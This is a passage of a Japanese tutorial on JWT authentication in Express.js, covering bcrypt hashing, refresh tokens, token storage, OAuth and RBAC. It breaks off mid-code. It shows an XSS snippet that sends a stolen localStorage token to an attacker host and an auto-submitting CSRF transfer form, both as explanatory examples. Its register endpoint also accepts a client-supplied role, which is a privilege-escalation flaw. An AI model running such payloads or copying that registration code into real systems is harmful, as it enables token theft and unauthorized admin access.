---
title: 'JWT認証'
order: 18
section: 'API/認証'
---

# JWT認証

## 認証とは何か

Webアプリケーションにおける「認証」は、大きく2つの概念に分かれる。混同されやすいが全く別のもの。

| 概念     | 英語                    | 意味                               | 例え                                         |
| -------- | ----------------------- | ---------------------------------- | -------------------------------------------- |
| **認証** | Authentication（AuthN） | 「あなたは誰か」を確認する         | ホテルのフロントで身分証を見せる             |
| **認可** | Authorization（AuthZ）  | 「あなたに何を許可するか」を決める | ホテルの部屋のカードキーで入れる部屋が決まる |

```
【認証と認可の流れ】

1. 認証（Authentication）
   ユーザー「IDはtaro、パスワードはxxxです」
   サーバー「確認しました。太郎さんですね」 ← あなたが誰かを確認

2. 認可（Authorization）
   太郎さん「管理画面にアクセスしたい」
   サーバー「太郎さんの権限は"一般ユーザー"なので、管理画面にはアクセスできません」 ← 何ができるかを判断
```

## なぜ認証が必要か

HTTPは**ステートレス（状態を持たない）** なプロトコル。つまり、サーバーは各リクエストが「誰から来たのか」を記憶していない。

認証がないWebアプリを想像してみよう:

- 誰でも他人のプロフィールを編集できる
- 誰でも管理者機能を使える
- 注文履歴が全ユーザーに公開される

つまり認証とは、**「このリクエストは確かにこのユーザーから来たもの」と証明する仕組み**。

## 認証方式の種類

### セッション認証

従来のWebアプリケーションで最も一般的だった方式。

```
1. ユーザーがログイン
   → サーバーが「セッション」を作成し、セッションIDをCookieに保存

2. 以降のリクエスト
   → ブラウザが自動的にCookieを送信
   → サーバーがセッションIDで「誰か」を特定

ブラウザ                              サーバー                    セッションストア
  |                                     |                           |
  |-- POST /login (ID, PW) ----------->|                           |
  |                                     |-- セッション作成 -------->|
  |                                     |<-- session_id: abc123 ---|
  |<-- Cookie: session_id=abc123 ------|                           |
  |                                     |                           |
  |-- GET /profile                      |                           |
  |   Cookie: session_id=abc123 ------->|                           |
  |                                     |-- abc123を検索 ---------->|
  |                                     |<-- ユーザー情報 ----------|
  |<-- { name: "太郎" } ---------------|                           |
```

### トークン認証（JWT）

セッション情報をサーバー側で保持せず、トークンに情報を含める方式。

```
1. ユーザーがログイン
   → サーバーがJWTを生成して返す

2. 以降のリクエスト
   → クライアントがAuthorizationヘッダーにJWTを含めて送信
   → サーバーがJWTの署名を検証して「誰か」を特定

ブラウザ                              サーバー
  |                                     |
  |-- POST /login (ID, PW) ----------->|
  |                                     | JWTを生成（秘密鍵で署名）
  |<-- { token: "eyJhbG..." } ---------|
  |                                     |
  |-- GET /profile                      |
  |   Authorization: Bearer eyJhbG... ->|
  |                                     | JWTの署名を検証（秘密鍵で）
  |                                     | トークン内のユーザー情報を取得
  |<-- { name: "太郎" } ---------------|
```

### OAuth

サードパーティのサービス（Google、GitHubなど）を使った認証。

### 比較表

| 項目             | セッション認証                   | JWT認証                          | OAuth 2.0            |
| ---------------- | -------------------------------- | -------------------------------- | -------------------- |
| 状態管理         | サーバー側で保持（ステートフル） | トークン内に含む（ステートレス） | トークンベース       |
| 保存場所         | サーバーのメモリ/DB + Cookie     | クライアント側                   | クライアント側       |
| スケーラビリティ | サーバー間でセッション共有が必要 | サーバー間で共有不要             | サーバー間で共有不要 |
| CSRF攻撃         | 脆弱（Cookie自動送信のため）     | 耐性あり（手動でヘッダー設定）   | 耐性あり             |
| XSS攻撃          | 比較的安全（httpOnly Cookie）    | localStorageは脆弱               | 実装による           |
| 無効化           | セッションを削除すればOK         | 有効期限まで無効化が困難         | トークン取り消し可能 |
| 用途             | 従来のWebアプリ                  | SPA、モバイルアプリ、API         | ソーシャルログイン   |
| 実装の複雑さ     | シンプル                         | 中程度                           | 複雑                 |

## JWTとは

JWT（JSON Web Token、発音は「ジョット」）は、JSON形式のデータに**電子署名**を付けてトークン化したもの。

### JWTの3つの構成要素

JWTは**ピリオド（.）で区切られた3つのパート**からなる文字列。

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIxMjMiLCJuYW1lIjoi5aSq6YOOIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3MTE2MTI4MDAsImV4cCI6MTcxMTYxNjQwMH0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
|___________________________|___________________________________|________________________|
      ヘッダー(Header)              ペイロード(Payload)             署名(Signature)
```

### 各パートの詳細

**1. ヘッダー（Header）**

トークンの種類と署名アルゴリズムを指定する。

```json
// Base64デコードすると:
{
  "alg": "HS256", // 署名アルゴリズム（HMAC SHA-256）
  "typ": "JWT" // トークンタイプ
}
```

**2. ペイロード（Payload）**

実際のデータ（クレーム）が入っている部分。**暗号化されていない**（Base64エンコードされているだけ）ため、誰でもデコードして中身を見ることができる。機密情報を入れてはいけない。

```json
// Base64デコードすると:
{
  "userId": "123", // カスタムクレーム
  "name": "太郎", // カスタムクレーム
  "role": "user", // カスタムクレーム
  "iat": 1711612800, // 発行日時（issued at）
  "exp": 1711616400, // 有効期限（expiration）
  "iss": "myapp.com", // 発行者（issuer）
  "sub": "123" // 主題（subject、通常はユーザーID）
}
```

標準クレーム:

| クレーム | 名前       | 説明                             |
| -------- | ---------- | -------------------------------- |
| `iss`    | Issuer     | トークンの発行者                 |
| `sub`    | Subject    | トークンの主題（ユーザーIDなど） |
| `aud`    | Audience   | トークンの対象者                 |
| `exp`    | Expiration | 有効期限（Unix timestamp）       |
| `iat`    | Issued At  | 発行日時（Unix timestamp）       |
| `nbf`    | Not Before | この日時より前は無効             |
| `jti`    | JWT ID     | トークンの一意な識別子           |

**3. 署名（Signature）**

ヘッダーとペイロードが**改ざんされていないことを証明**するための部分。サーバーが持つ秘密鍵で生成される。

```
署名 = HMAC-SHA256(
  Base64Encode(ヘッダー) + "." + Base64Encode(ペイロード),
  秘密鍵
)
```

### JWTの検証プロセス

```
1. クライアントがJWTを送信
2. サーバーがJWTを受信
3. ヘッダーとペイロード部分 + 秘密鍵 で署名を再計算
4. 再計算した署名 と トークン内の署名 を比較
   - 一致 → 改ざんされていない（有効）
   - 不一致 → 改ざんされている（無効）
5. 有効期限（exp）のチェック
   - 期限内 → OK
   - 期限切れ → 無効
```

**重要: JWTは「暗号化」ではなく「署名」。** ペイロードの中身は誰でも読める。署名によって保証されるのは「データが改ざんされていないこと」だけ。パスワードやクレジットカード番号などの機密情報をペイロードに含めてはいけない。

### Base64デコードの例

Node.jsでJWTの中身を確認する方法。

```javascript
const token =
  'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIxMjMiLCJuYW1lIjoi5aSq6YOOIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3MTE2MTI4MDAsImV4cCI6MTcxMTYxNjQwMH0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c'

const parts = token.split('.')
const header = JSON.parse(Buffer.from(parts[0], 'base64').toString())
const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString())

console.log('ヘッダー:', header)
// { alg: 'HS256', typ: 'JWT' }

console.log('ペイロード:', payload)
// { userId: '123', name: '太郎', role: 'user', iat: 1711612800, exp: 1711616400 }
```

## セッション認証 vs JWT

| 比較項目             | セッション認証                                      | JWT                                          |
| -------------------- | --------------------------------------------------- | -------------------------------------------- |
| **仕組み**           | サーバーがセッション情報を保存                      | トークンに情報を含める                       |
| **状態**             | ステートフル（サーバーが状態を持つ）                | ステートレス（サーバーは状態を持たない）     |
| **スケーラビリティ** | サーバーを増やす際にセッション共有が必要（Redis等） | サーバー間で共有不要。秘密鍵さえ共有すればOK |
| **サーバー負荷**     | セッションストアへのアクセスが毎回発生              | 署名検証のみ（計算処理）                     |
| **即時無効化**       | セッションを削除すれば即座に無効化                  | 有効期限まで無効化が困難                     |
| **クロスドメイン**   | Cookieの制約あり                                    | Authorizationヘッダーで柔軟                  |
| **モバイル対応**     | Cookieの扱いが面倒                                  | ヘッダーに含めるだけで簡単                   |

**どちらを選ぶべきか:**

| ケース                              | 推奨方式       | 理由                             |
| ----------------------------------- | -------------- | -------------------------------- |
| 従来のサーバーレンダリングWebアプリ | セッション認証 | シンプル、即時無効化が容易       |
| SPA（React, Vue等）+ API            | JWT            | クロスオリジン対応、ステートレス |
| モバイルアプリ + API                | JWT            | Cookie不要、ヘッダーで送信       |
| マイクロサービス                    | JWT            | サービス間で状態共有不要         |

## Express.jsでのJWT実装

### 準備

```bash
npm init -y
npm install express jsonwebtoken bcryptjs dotenv
npm install --save-dev nodemon
```

```
# .env
PORT=3000
JWT_SECRET=your-super-secret-key-change-this-in-production-12345
JWT_EXPIRES_IN=1h
JWT_REFRESH_SECRET=your-refresh-secret-key-change-this-too-67890
JWT_REFRESH_EXPIRES_IN=7d
```

### 全コード例

```javascript
// app.js
require('dotenv').config()
const express = require('express')
const jwt = require('jsonwebtoken')
const bcrypt = require('bcryptjs')

const app = express()
app.use(express.json())

// ========================================
// 仮のデータベース（実際にはDB使用）
// ========================================
const users = []
const refreshTokens = [] // リフレッシュトークンの保存（実際にはDBに保存）

// ========================================
// ユーティリティ関数
// ========================================

// アクセストークンの生成
function generateAccessToken(user) {
  return jwt.sign(
    { userId: user.id, email: user.email, role: user.role },
    process.env.JWT_SECRET,
    { expiresIn: process.env.JWT_EXPIRES_IN } // 1時間
  )
}

// リフレッシュトークンの生成
function generateRefreshToken(user) {
  return jwt.sign(
    { userId: user.id },
    process.env.JWT_REFRESH_SECRET,
    { expiresIn: process.env.JWT_REFRESH_EXPIRES_IN } // 7日間
  )
}

// ========================================
// 認証ミドルウェア
// ========================================
function authenticate(req, res, next) {
  const authHeader = req.headers.authorization

  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({
      error: { message: '認証トークンが必要です' },
    })
  }

  const token = authHeader.split(' ')[1] // "Bearer <token>" から token部分を取得

  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET)
    req.user = decoded // デコードされたペイロードをreqに追加
    next()
  } catch (err) {
    if (err.name === 'TokenExpiredError') {
      return res.status(401).json({
        error: { message: 'トークンの有効期限が切れています', code: 'TOKEN_EXPIRED' },
      })
    }
    return res.status(401).json({
      error: { message: '無効なトークンです' },
    })
  }
}

// ========================================
// 認可ミドルウェア（ロールベース）
// ========================================
function authorize(...allowedRoles) {
  return (req, res, next) => {
    if (!req.user) {
      return res.status(401).json({
        error: { message: '認証が必要です' },
      })
    }
    if (!allowedRoles.includes(req.user.role)) {
      return res.status(403).json({
        error: { message: 'この操作を行う権限がありません' },
      })
    }
    next()
  }
}

// ========================================
// ユーザー登録
// POST /api/auth/register
// ========================================
app.post('/api/auth/register', async (req, res) => {
  try {
    const { name, email, password, role } = req.body

    // バリデーション
    if (!name || !email || !password) {
      return res.status(400).json({
        error: { message: '名前、メールアドレス、パスワードは必須です' },
      })
    }

    if (password.length < 8) {
      return res.status(400).json({
        error: { message: 'パスワードは8文字以上で設定してください' },
      })
    }

    // メールアドレスの重複チェック
    if (users.find((u) => u.email === email)) {
      return res.status(409).json({
        error: { message: 'このメールアドレスは既に登録されています' },
      })
    }

    // パスワードのハッシュ化（平文で保存しない!）
    const salt = await bcrypt.genSalt(10)
    const hashedPassword = await bcrypt.hash(password, salt)

    // ユーザーの作成
    const user = {
      id: users.length + 1,
      name,
      email,
      password: hashedPassword, // ハッシュ化されたパスワードを保存
      role: role || 'user',
      createdAt: new Date().toISOString(),
    }
    users.push(user)

    // トークンの生成
    const accessToken = generateAccessToken(user)
    const refreshToken = generateRefreshToken(user)
    refreshTokens.push(refreshToken)

    // パスワードを除外してレスポンス
    const { password: _, ...userWithoutPassword } = user
    res.status(201).json({
      message: 'ユーザー登録が完了しました',
      user: userWithoutPassword,
      accessToken,
      refreshToken,
    })
  } catch (err) {
    console.error('登録エラー:', err)
    res.status(500).json({ error: { message: 'サーバーエラーが発生しました' } })
  }
})

// ========================================
// ログイン
// POST /api/auth/login
// ========================================
app.post('/api/auth/login', async (req, res) => {
  try {
    const { email, password } = req.body

    // バリデーション
    if (!email || !password) {
      return res.status(400).json({
        error: { message: 'メールアドレスとパスワードは必須です' },
      })
    }

    // ユーザーの検索
    const user = users.find((u) => u.email === email)
    if (!user) {
      // セキュリティ: 「メールアドレスが見つかりません」とは言わない
      return res.status(401).json({
        error: { message: 'メールアドレスまたはパスワードが正しくありません' },
      })
    }

    // パスワードの照合
    const isMatch = await bcrypt.compare(password, user.password)
    if (!isMatch) {
      return res.status(401).json({
        error: { message: 'メールアドレスまたはパスワードが正しくありません' },
      })
    }

    // トークンの生成
    const accessToken = generateAccessToken(user)
    const refreshToken = generateRefreshToken(user)
    refreshTokens.push(refreshToken)

    const { password: _, ...userWithoutPassword } = user
    res.json({
      message: 'ログインに成功しました',
      user: userWithoutPassword,
      accessToken,
      refreshToken,
    })
  } catch (err) {
    console.error('ログインエラー:', err)
    res.status(500).json({ error: { message: 'サーバーエラーが発生しました' } })
  }
})

// ========================================
// トークンのリフレッシュ
// POST /api/auth/refresh
// ========================================
app.post('/api/auth/refresh', (req, res) => {
  const { refreshToken } = req.body

  if (!refreshToken) {
    return res.status(400).json({
      error: { message: 'リフレッシュトークンが必要です' },
    })
  }

  // リフレッシュトークンの存在確認
  if (!refreshTokens.includes(refreshToken)) {
    return res.status(403).json({
      error: { message: '無効なリフレッシュトークンです' },
    })
  }

  try {
    const decoded = jwt.verify(refreshToken, process.env.JWT_REFRESH_SECRET)
    const user = users.find((u) => u.id === decoded.userId)

    if (!user) {
      return res.status(404).json({
        error: { message: 'ユーザーが見つかりません' },
      })
    }

    // 新しいアクセストークンを生成
    const newAccessToken = generateAccessToken(user)

    res.json({
      accessToken: newAccessToken,
    })
  } catch (err) {
    return res.status(403).json({
      error: { message: 'リフレッシュトークンの有効期限が切れています' },
    })
  }
})

// ========================================
// ログアウト
// POST /api/auth/logout
// ========================================
app.post('/api/auth/logout', (req, res) => {
  const { refreshToken } = req.body

  // リフレッシュトークンを削除
  const index = refreshTokens.indexOf(refreshToken)
  if (index > -1) {
    refreshTokens.splice(index, 1)
  }

  res.json({ message: 'ログアウトしました' })
})

// ========================================
// 保護されたルート（認証必須）
// ========================================

// プロフィール取得（ログインユーザーのみ）
app.get('/api/profile', authenticate, (req, res) => {
  const user = users.find((u) => u.id === req.user.userId)
  if (!user) {
    return res.status(404).json({ error: { message: 'ユーザーが見つかりません' } })
  }
  const { password, ...userWithoutPassword } = user
  res.json(userWithoutPassword)
})

// 管理者専用ルート（admin権限が必要）
app.get('/api/admin/users', authenticate, authorize('admin'), (req, res) => {
  const usersWithoutPasswords = users.map(({ password, ...u }) => u)
  res.json({ users: usersWithoutPasswords })
})

// モデレーター以上のルート（adminまたはmoderator権限が必要）
app.delete('/api/posts/:id', authenticate, authorize('admin', 'moderator'), (req, res) => {
  res.json({ message: `投稿 ${req.params.id} を削除しました` })
})

// ========================================
// サーバー起動
// ========================================
const PORT = process.env.PORT || 3000
app.listen(PORT, () => {
  console.log(`認証APIサーバーが http://localhost:${PORT} で起動しました`)
})
```

### curlでのテスト

```bash
# ユーザー登録
curl -X POST http://localhost:3000/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"name": "太郎", "email": "taro@example.com", "password": "password123"}'

# ログイン
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email": "taro@example.com", "password": "password123"}'
# → レスポンスの accessToken をコピー

# プロフィール取得（トークン必須）
curl http://localhost:3000/api/profile \
  -H "Authorization: Bearer <ここにaccessTokenを貼り付け>"

# トークンなしでアクセス（401エラーになる）
curl http://localhost:3000/api/profile

# トークンのリフレッシュ
curl -X POST http://localhost:3000/api/auth/refresh \
  -H "Content-Type: application/json" \
  -d '{"refreshToken": "<ここにrefreshTokenを貼り付け>"}'

# ログアウト
curl -X POST http://localhost:3000/api/auth/logout \
  -H "Content-Type: application/json" \
  -d '{"refreshToken": "<ここにrefreshTokenを貼り付け>"}'
```

## アクセストークンとリフレッシュトークン

### なぜ2つのトークンが必要なのか

アクセストークンだけでは以下のジレンマが生じる:

- **有効期限を長くすると** → トークンが漏洩した際のリスクが高い
- **有効期限を短くすると** → すぐに期限切れになり、ユーザーが頻繁にログインし直す必要がある

この問題を解決するのが**2トークン方式**。

```
【2トークン方式の仕組み】

アクセストークン: 有効期限が短い（15分〜1時間）
  → API呼び出しに毎回使用
  → 漏洩しても被害が限定的

リフレッシュトークン: 有効期限が長い（7日〜30日）
  → アクセストークンの再発行にのみ使用
  → サーバー側で無効化可能
```

```
ブラウザ                              サーバー
  |                                     |
  |-- POST /login ---------------------->|
  |<-- accessToken(1h) + refreshToken(7d)|
  |                                     |
  |-- GET /api/data                     |
  |   Authorization: Bearer accessToken->|
  |<-- データ --------------------------|
  |                                     |
  |    ... 1時間後、アクセストークン期限切れ ...
  |                                     |
  |-- GET /api/data                     |
  |   Authorization: Bearer accessToken->|
  |<-- 401 TOKEN_EXPIRED ←（期限切れ）--|
  |                                     |
  |-- POST /refresh                     |
  |   { refreshToken: "..." } --------->|
  |<-- 新しいaccessToken(1h) -----------|
  |                                     |
  |-- GET /api/data                     |
  |   Authorization: Bearer 新accessToken>|
  |<-- データ --------------------------|
```

### トークンの有効期限の目安

| トークン             | 有効期限    | 理由                                     |
| -------------------- | ----------- | ---------------------------------------- |
| アクセストークン     | 15分〜1時間 | 短いほどセキュア。漏洩時の被害を限定     |
| リフレッシュトークン | 7日〜30日   | ユーザーの利便性とセキュリティのバランス |

## トークンの保存場所

### localStorage vs httpOnly Cookie

| 比較項目                   | localStorage                           | httpOnly Cookie                        |
| -------------------------- | -------------------------------------- | -------------------------------------- |
| XSS攻撃への耐性            | **脆弱**（JavaScriptからアクセス可能） | **安全**（JavaScriptからアクセス不可） |
| CSRF攻撃への耐性           | **安全**（自動送信されない）           | **脆弱**（自動送信される）             |
| 実装の簡単さ               | 簡単                                   | やや複雑（CSRF対策が必要）             |
| クロスドメイン             | 同一オリジンのみ                       | SameSite属性で制御                     |
| サーバーサイドレンダリング | 使えない（ブラウザAPIのため）          | 使える                                 |

**XSS攻撃**: 攻撃者がWebページにJavaScriptを注入し、localStorageの中身を盗む攻撃。

```javascript
// XSS攻撃の例（攻撃者がページに注入するコード）
// localStorageに保存されたトークンを盗む
const token = localStorage.getItem('accessToken')
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({ token }),
})
// → httpOnly Cookieならこの攻撃は無効
```

**CSRF攻撃**: 別のサイトから、ユーザーのCookieを利用してリクエストを送信する攻撃。

```html
<!-- 攻撃者のサイトに仕込まれたフォーム -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker" />
  <input type="hidden" name="amount" value="1000000" />
</form>
<script>
  document.forms[0].submit()
</script>
<!-- → Cookieが自動送信され、ユーザーの認証で送金されてしまう -->
<!-- → localStorageなら自動送信されないので安全 -->
```

### 推奨される保存方法

```
【推奨パターン】
アクセストークン → メモリ（変数）に保存
  → XSSでも盗まれにくい（ただしページリロードで消える）

リフレッシュトークン → httpOnly Cookie
  → JavaScriptからアクセス不可、CSRF対策としてSameSite=Strictを設定
```

```javascript
// サーバー側: リフレッシュトークンをhttpOnly Cookieとして設定
app.post('/api/auth/login', async (req, res) => {
  // ... ログイン処理 ...

  const accessToken = generateAccessToken(user)
  const refreshToken = generateRefreshToken(user)

  // リフレッシュトークンをhttpOnly Cookieに設定
  res.cookie('refreshToken', refreshToken, {
    httpOnly: true, // JavaScriptからアクセス不可
    secure: true, // HTTPS接続のみ（本番環境）
    sameSite: 'strict', // 同一サイトからのリクエストのみ
    maxAge: 7 * 24 * 60 * 60 * 1000, // 7日間
    path: '/api/auth/refresh', // リフレッシュエンドポイントのみで送信
  })

  // アクセストークンはJSONで返す（クライアント側でメモリに保存）
  res.json({ accessToken })
})
```

```javascript
// クライアント側（React等）
// アクセストークンをメモリに保持
let accessToken = null

async function login(email, password) {
  const res = await fetch('/api/auth/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email, password }),
    credentials: 'include', // Cookieを含める
  })
  const data = await res.json()
  accessToken = data.accessToken // メモリに保存
}

async function fetchWithAuth(url) {
  let res = await fetch(url, {
    headers: { Authorization: `Bearer ${accessToken}` },
  })

  // 401が返ったらトークンをリフレッシュ
  if (res.status === 401) {
    const refreshRes = await fetch('/api/auth/refresh', {
      method: 'POST',
      credentials: 'include', // Cookieのリフレッシュトークンを送信
    })
    const refreshData = await refreshRes.json()
    accessToken = refreshData.accessToken

    // リトライ
    res = await fetch(url, {
      headers: { Authorization: `Bearer ${accessToken}` },
    })
  }

  return res.json()
}
```

## bcryptによるパスワードハッシュ化

### なぜ平文保存はダメなのか

データベースが漏洩した場合を考える。

```
【平文保存の場合】
テーブル: users
| id | email            | password     |
|----|------------------|--------------|
| 1  | taro@example.com | password123  |  ← 全ユーザーのパスワードが丸見え!
| 2  | hana@example.com | mysecret456  |

【ハッシュ化保存の場合】
テーブル: users
| id | email            | password                                                     |
|----|------------------|--------------------------------------------------------------|
| 1  | taro@example.com | $2b$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy |
| 2  | hana@example.com | $2b$10$VEBKdGcH5.hy0nt5vU1mnOlCRPYSzPdYqL.2jZo0hIiJbK/sC.Ij6 |
→ 元のパスワードを復元できない（一方向性）
```

### ハッシュ化とソルト

**ハッシュ化**: データを一定長の不可逆な文字列に変換する処理。同じ入力は常に同じ出力になる。

**ソルト**: ハッシュ化の前にパスワードに追加するランダムな文字列。同じパスワードでも異なるハッシュ値が生成される。

```
【ソルトなし（レインボーテーブル攻撃に脆弱）】
"password123" → SHA256 → "ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f"
↑ この変換結果は誰がやっても同じ。事前に計算済みの表（レインボーテーブル）で逆引きできてしまう

【ソルトあり（bcrypt）】
"password123" + ソルト"$2b$10$N9qo8uLOickgx2ZMRZoMye"
→ "$2b$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy"

"password123" + ソルト"$2b$10$VEBKdGcH5.hy0nt5vU1mnO"
→ "$2b$10$VEBKdGcH5.hy0nt5vU1mnOlCRPYSzPdYqL.2jZo0hIiJbK/sC.Ij6"
↑ 同じパスワードでもソルトが違うのでハッシュ値が異なる!
```

### bcryptの使い方

```javascript
const bcrypt = require('bcryptjs')

// パスワードのハッシュ化
async function hashPassword(plainPassword) {
  // ソルトラウンド: 数値が大きいほど安全だが遅くなる（10〜12が推奨）
  const salt = await bcrypt.genSalt(10)
  const hashed = await bcrypt.hash(plainPassword, salt)
  return hashed
}

// パスワードの照合
async function verifyPassword(plainPassword, hashedPassword) {
  const isMatch = await bcrypt.compare(plainPassword, hashedPassword)
  return isMatch
}

// 使用例
async function demo() {
  const password = 'mySecretPassword'

  // ハッシュ化
  const hashed = await hashPassword(password)
  console.log('ハッシュ:', hashed)
  // → $2b$10$XXXXX...（毎回異なる値になる）

  // 照合
  console.log('正しいPW:', await verifyPassword('mySecretPassword', hashed)) // true
  console.log('間違いPW:', await verifyPassword('wrongPassword', hashed)) // false
}
demo()
```

### bcryptのハッシュ値の構造

```
$2b$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy
|__|__|________________________|__________________________________|
 |   |          |                              |
 |   |          ソルト（22文字）               ハッシュ値（31文字）
 |   コストファクター（10 = 2^10回の計算）
 アルゴリズムバージョン（2b）
```

## JWTの脆弱性と対策

| 脆弱性                 | 内容                                          | 対策                                                |
| ---------------------- | --------------------------------------------- | --------------------------------------------------- |
| トークン漏洩           | XSS攻撃やネットワーク傍受でトークンが盗まれる | httpOnly Cookie、HTTPS必須、短い有効期限            |
| 有効期限内の無効化不可 | トークンを即座に無効化できない                | 短い有効期限 + リフレッシュトークン、ブラックリスト |
| algフィールドの改ざん  | `alg: "none"`にして署名を無効化する攻撃       | アルゴリズムをサーバー側で固定                      |
| 秘密鍵の漏洩           | 秘密鍵が漏れると全トークンが偽造可能          | 環境変数で管理、定期的なローテーション              |
| ペイロードの情報漏洩   | JWTは暗号化されていない                       | 機密情報をペイロードに含めない                      |

### ブラックリスト方式

JWTの即時無効化が必要な場合（パスワード変更、アカウント停止など）に使う。

```javascript
const blacklistedTokens = new Set() // 実際にはRedis等を使用

// ログアウト時にトークンをブラックリストに追加
app.post('/api/auth/logout', authenticate, (req, res) => {
  const token = req.headers.authorization.split(' ')[1]
  blacklistedTokens.add(token)
  res.json({ message: 'ログアウトしました' })
})

// 認証ミドルウェアでブラックリストをチェック
function authenticate(req, res, next) {
  const token = req.headers.authorization?.split(' ')[1]
  if (!token) return res.status(401).json({ error: { message: '認証が必要です' } })

  // ブラックリストチェック
  if (blacklistedTokens.has(token)) {
    return res.status(401).json({ error: { message: 'トークンは無効化されています' } })
  }

  try {
    req.user = jwt.verify(token, process.env.JWT_SECRET)
    next()
  } catch (err) {
    return res.status(401).json({ error: { message: '無効なトークンです' } })
  }
}
```

### セキュリティのベストプラクティス

```javascript
// アルゴリズムをサーバー側で固定する（alg: "none" 攻撃対策）
const decoded = jwt.verify(token, process.env.JWT_SECRET, {
  algorithms: ['HS256'], // 許可するアルゴリズムを明示
})

// 秘密鍵は十分に長くランダムにする
// 悪い例: JWT_SECRET=secret
// 良い例: JWT_SECRET=a3f2c7e9d1b4... (64文字以上のランダム文字列)

// Node.jsで安全な秘密鍵を生成
const crypto = require('crypto')
console.log(crypto.randomBytes(64).toString('hex'))
```

## OAuth 2.0の概要

OAuth 2.0は、ユーザーのパスワードを第三者に教えずに、第三者にリソースへのアクセスを許可するための**認可**フレームワーク。

### 身近な例

「GitHubでログイン」ボタンを押した時の裏側。

```
あなた                     あなたのアプリ                GitHub
  |                             |                        |
  |-- 「GitHubでログイン」 ----->|                        |
  |                             |-- ログインページへ転送 ->|
  |<-- GitHubログイン画面 ------|                        |
  |                             |                        |
  |-- GitHubにID/PW入力 --------|----------------------->|
  |                             |                        | 認証成功
  |                             |<-- 認可コード ---------|
  |                             |                        |
  |                             |-- 認可コード + シークレット -->|
  |                             |<-- アクセストークン --------|
  |                             |                        |
  |                             |-- GET /user (トークン付き) ->|
  |                             |<-- ユーザー情報 -----------|
  |                             |                        |
  |<-- ログイン完了 ------------|                        |
```

**ポイント**: ユーザーのGitHubパスワードをあなたのアプリは知らない。GitHubが「この人はOKです」とトークンを発行してくれる。

### 認可コードフロー（Authorization Code Flow）

最も安全で推奨されるOAuth 2.0のフロー。

```
1. クライアントがユーザーを認可エンドポイントにリダイレクト
   https://github.com/login/oauth/authorize?
     client_id=YOUR_CLIENT_ID&
     redirect_uri=http://localhost:3000/callback&
     scope=read:user&
     state=random_csrf_token

2. ユーザーがGitHubでログインし、アクセスを許可

3. GitHubがコールバックURLに認可コードを送信
   http://localhost:3000/callback?code=AUTH_CODE&state=random_csrf_token

4. サーバーが認可コードをアクセストークンと交換
   POST https://github.com/login/oauth/access_token
   {
     client_id: YOUR_CLIENT_ID,
     client_secret: YOUR_CLIENT_SECRET,
     code: AUTH_CODE
   }

5. アクセストークンでユーザー情報を取得
   GET https://api.github.com/user
   Authorization: Bearer ACCESS_TOKEN
```

### 簡易的なGitHub OAuth実装

```javascript
const express = require('express')
const app = express()

const CLIENT_ID = process.env.GITHUB_CLIENT_ID
const CLIENT_SECRET = process.env.GITHUB_CLIENT_SECRET
const REDIRECT_URI = 'http://localhost:3000/auth/github/callback'

// 1. GitHubの認証ページにリダイレクト
app.get('/auth/github', (req, res) => {
  const githubAuthUrl = `https://github.com/login/oauth/authorize?client_id=${CLIENT_ID}&redirect_uri=${REDIRECT_URI}&scope=read:user`
  res.redirect(githubAuthUrl)
})

// 2. GitHubからのコールバック処理
app.get('/auth/github/callback', async (req, res) => {
  const { code } = req.query

  // 認可コードをアクセストークンに交換
  const tokenResponse = await fetch('https://github.com/login/oauth/access_token', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      Accept: 'application/json',
    },
    body: JSON.stringify({
      client_id: CLIENT_ID,
      client_secret: CLIENT_SECRET,
      code,
    }),
  })
  const { access_token } = await tokenResponse.json()

  // アクセストークンでユーザー情報を取得
  const userResponse = await fetch('https://api.github.com/user', {
    headers: { Authorization: `Bearer ${access_token}` },
  })
  const githubUser = await userResponse.json()

  // ユーザー情報を使ってログイン/登録処理
  console.log('GitHubユーザー:', githubUser.login, githubUser.email)

  // 自前のJWTを発行してクライアントに返す
  const jwt_token = generateAccessToken({
    id: githubUser.id,
    name: githubUser.login,
    email: githubUser.email,
    role: 'user',
  })

  res.json({ message: 'GitHubログイン成功', token: jwt_token })
})

app.listen(3000)
```

## RBAC（Role-Based Access Control）の実装パターン

RBAC（ロールベースアクセス制御）は、ユーザーに「ロール（役割）」を割り当て、ロールごとにアクセス権限を制御する仕組み。

### ロール設計の例

```javascript
// ロールと権限の定義
const ROLES = {
  admin: {
    name: '管理者',
    permissions: [
      'user:read',
      'user:create',
      'user:update',
      'user:delete',
      'post:read',
      'post:create',
      'post:update',
      'post:delete',
      'comment:read',
      'comment:create',
      'comment:update',
      'comment:delete',
      'admin:access',
    ],
  },
  moderator: {
    name: 'モデレーター',
    permissions: [
      'user:read',
      'post:read',
      'post:update',
      'post:delete',
      'comment:read',
      'comment:update',
      'comment:delete',
    ],
  },
  user: {
    name: '一般ユーザー',
    permissions: ['user:read', 'post:read', 'post:create', 'comment:read', 'comment:create'],
  },
  guest: {
    name: 'ゲスト',
    permissions: ['post:read', 'comment:read'],
  },
}
```

### 権限チェックミドルウェア

```javascript
// 特定の権限を持っているかチェックするミドルウェア
function requirePermission(...requiredPermissions) {
  return (req, res, next) => {
    if (!req.user) {
      return res.status(401).json({ error: { message: '認証が必要です' } })
    }

    const userRole = ROLES[req.user.role]
    if (!userRole) {
